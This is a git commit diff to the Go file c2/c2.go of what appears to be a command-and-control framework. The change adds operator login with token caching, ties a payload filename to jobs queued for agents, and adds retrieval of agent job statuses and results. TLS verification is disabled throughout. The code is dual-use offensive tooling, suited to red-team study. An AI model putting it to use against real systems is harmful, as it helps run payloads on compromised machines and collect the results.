0580bd1c59993409741a40ed33e92d22a326df61
whatsyourask <lexeymartynov@gmail.com>
2024-05-05 18:40:03 +0300

    Added checks on given authorization token, added in AddJobs method payloadFilename, so I could bind payload with job at this stage

--- c2/c2.go
+++ c2/c2.go
@@ -40,17 +40,15 @@ func NewC2Module(localHostOpt, localPortOpt string) *C2Module {
 	}
 	c2m.c2s = c2
 	c2m.apiUrl = "https://" + "127.0.0.1" + ":" + c2m.localPort
+	c2m.authorizationToken = ""
+	c2m.authorizationTokenExpire = ""
 	return &c2m
 }
 
 func (c2m *C2Module) Run() {
 	c2m.logger.Log.Infof("A new C2 server started on %s:%s", c2m.localHost, c2m.localPort)
 	go c2m.protect(c2m.c2s.Run)
-	// err := c2m.operatorLogin()
-	// if err != nil {
-	// 	c2m.logger.Log.Error(err)
-	// }
-	// fmt.Println(c2m.GetAgents())
+	// c2m.AddJob("79ce8549-320d-4493-bd2d-c0e9a3802e5f")
 }
 
 func (c2m *C2Module) protect(f func() error) {
@@ -66,15 +64,12 @@ func (c2m *C2Module) protect(f func() error) {
 }
 
 func (c2m *C2Module) GetAgents() []transport.Agent {
-	agents := c2m.getAgents()
-	return agents
-}
-
-func (c2m *C2Module) getAgents() []transport.Agent {
-	err := c2m.operatorLogin()
-	if err != nil {
-		c2m.logger.Log.Error(err)
-		return nil
+	if c2m.authorizationToken == "" {
+		err := c2m.operatorLogin()
+		if err != nil {
+			c2m.logger.Log.Error(err)
+			return nil
+		}
 	}
 	req, err := http.NewRequest("GET", c2m.apiUrl+"/operator/agents", nil)
 	if err != nil {
@@ -89,7 +84,7 @@ func (c2m *C2Module) getAgents() []transport.Agent {
 	}
 	resp, err := client.Do(req)
 	if err != nil {
-		c2m.logger.Log.Errorf("can't perform a POST request: %v", err)
+		c2m.logger.Log.Errorf("can't perform a request: %v", err)
 		return nil
 	}
 	respBody, err := io.ReadAll(resp.Body)
@@ -106,15 +101,64 @@ func (c2m *C2Module) getAgents() []transport.Agent {
 	return respJson
 }
 
-func (c2m *C2Module) AddJob(agentUuid string) error {
+func (c2m *C2Module) operatorLogin() error {
+	loginPostBody := map[string]string{"username": "c2operator", "password": c2m.password}
+	loginPostJson, err := json.Marshal(loginPostBody)
+	if err != nil {
+		return fmt.Errorf("can't marshal a json for POST login: %v", err)
+	}
+	req, err := http.NewRequest("POST", c2m.apiUrl+"/login", bytes.NewBuffer(loginPostJson))
+	if err != nil {
+		return fmt.Errorf("can't create a POST request: %v", err)
+	}
+	req.Header.Set("Content-Type", "application/json")
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("can't perform a request: %v", err)
+	}
+	respBody, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return fmt.Errorf("can't do io.ReadAll: %v", err)
+	}
+	var respJson struct {
+		Code   int    `json:"code"`
+		Expire string `json:"expire"`
+		Token  string `json:"token"`
+	}
+	err = json.Unmarshal(respBody, &respJson)
+	if err != nil {
+		return fmt.Errorf("can't unmarshal a JSON in response: %v", err)
+	}
+	if respJson.Code == 200 {
+		c2m.authorizationToken = respJson.Token
+		c2m.authorizationTokenExpire = respJson.Expire
+	} else {
+		return fmt.Errorf("can't login with this credentials: %v, %v", respJson.Code, err)
+	}
+	return nil
+}
+
+func (c2m *C2Module) AddJob(agentUuid string, payloadFilename string) error {
+	if c2m.authorizationToken == "" {
+		err := c2m.operatorLogin()
+		if err != nil {
+			c2m.logger.Log.Error(err)
+			return nil
+		}
+	}
 	uuid := uuid.New()
 	jobUuid := uuid.String()
-	addJobPostBody := map[string]string{"agent-uuid": agentUuid, "job-uuid": jobUuid}
+	addJobPostBody := map[string]string{"agent-uuid": agentUuid, "job-uuid": jobUuid, "paylod-filename": payloadFilename}
 	addJobPostJson, err := json.Marshal(addJobPostBody)
 	if err != nil {
 		return fmt.Errorf("can't marshal a json for POST login: %v", err)
 	}
-	req, err := http.NewRequest("POST", c2m.apiUrl+"/agents/job/add", bytes.NewBuffer(addJobPostJson))
+	req, err := http.NewRequest("POST", c2m.apiUrl+"/operator/agents/job/add", bytes.NewBuffer(addJobPostJson))
 	if err != nil {
 		return fmt.Errorf("can't create a POST request: %v", err)
 	}
@@ -127,7 +171,7 @@ func (c2m *C2Module) AddJob(agentUuid string) error {
 	}
 	resp, err := client.Do(req)
 	if err != nil {
-		c2m.logger.Log.Errorf("can't perform a POST request: %v", err)
+		c2m.logger.Log.Errorf("can't perform a request: %v", err)
 		return nil
 	}
 	respBody, err := io.ReadAll(resp.Body)
@@ -152,17 +196,20 @@ func (c2m *C2Module) AddJob(agentUuid string) error {
 	}
 }
 
-func (c2m *C2Module) operatorLogin() error {
-	loginPostBody := map[string]string{"username": "c2operator", "password": c2m.password}
-	loginPostJson, err := json.Marshal(loginPostBody)
-	if err != nil {
-		return fmt.Errorf("can't marshal a json for POST login: %v", err)
+func (c2m *C2Module) GetAllAgentJobs(agentUuid string) ([]string, map[string]bool, map[string]string) {
+	if c2m.authorizationToken == "" {
+		err := c2m.operatorLogin()
+		if err != nil {
+			c2m.logger.Log.Error(err)
+			return nil, nil, nil
+		}
 	}
-	req, err := http.NewRequest("POST", c2m.apiUrl+"/login", bytes.NewBuffer(loginPostJson))
+	req, err := http.NewRequest("GET", c2m.apiUrl+"/agents/"+agentUuid+"/jobs", nil)
 	if err != nil {
-		return fmt.Errorf("can't create a POST request: %v", err)
+		c2m.logger.Log.Errorf("can't create a new request: %v", err)
+		return nil, nil, nil
 	}
-	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Authorization", "Bearer "+c2m.authorizationToken)
 	client := &http.Client{
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
@@ -170,26 +217,34 @@ func (c2m *C2Module) operatorLogin() error {
 	}
 	resp, err := client.Do(req)
 	if err != nil {
-		return fmt.Errorf("can't perform a POST request: %v", err)
+		c2m.logger.Log.Errorf("can't perform a request: %v", err)
+		return nil, nil, nil
 	}
 	respBody, err := io.ReadAll(resp.Body)
 	if err != nil {
-		return fmt.Errorf("can't do io.ReadAll: %v", err)
+		c2m.logger.Log.Errorf("can't do io.ReadAll: %v", err)
+		return nil, nil, nil
 	}
-	var respJson struct {
-		Code   int    `json:"code"`
-		Expire string `json:"expire"`
-		Token  string `json:"token"`
+	type AgentJob struct {
+		Job    string `json:"job-uuid"`
+		Status bool   `json:"status"`
+		Result string `json:"job-result"`
 	}
-	err = json.Unmarshal(respBody, &respJson)
+	var agentJobsStatus struct {
+		AgentJobs []AgentJob `json:"agent-jobs"`
+	}
+	err = json.Unmarshal(respBody, &agentJobsStatus)
 	if err != nil {
-		return fmt.Errorf("can't unmarshal a JSON in response: %v", err)
+		c2m.logger.Log.Errorf("can't unmarshal a JSON in response: %v", err)
+		return nil, nil, nil
 	}
-	if respJson.Code == 200 {
-		c2m.authorizationToken = respJson.Token
-		c2m.authorizationTokenExpire = respJson.Expire
-	} else {
-		return fmt.Errorf("can't login with this credentials: %v, %v", respJson.Code, err)
+	jobs := []string{}
+	jobsStatus := make(map[string]bool)
+	jobsResult := make(map[string]string)
+	for _, agentJobStatus := range agentJobsStatus.AgentJobs {
+		jobs = append(jobs, agentJobStatus.Job)
+		jobsStatus[agentJobStatus.Job] = agentJobStatus.Status
+		jobsResult[agentJobStatus.Job] = agentJobStatus.Result
 	}
-	return nil
+	return jobs, jobsStatus, jobsResult
 }
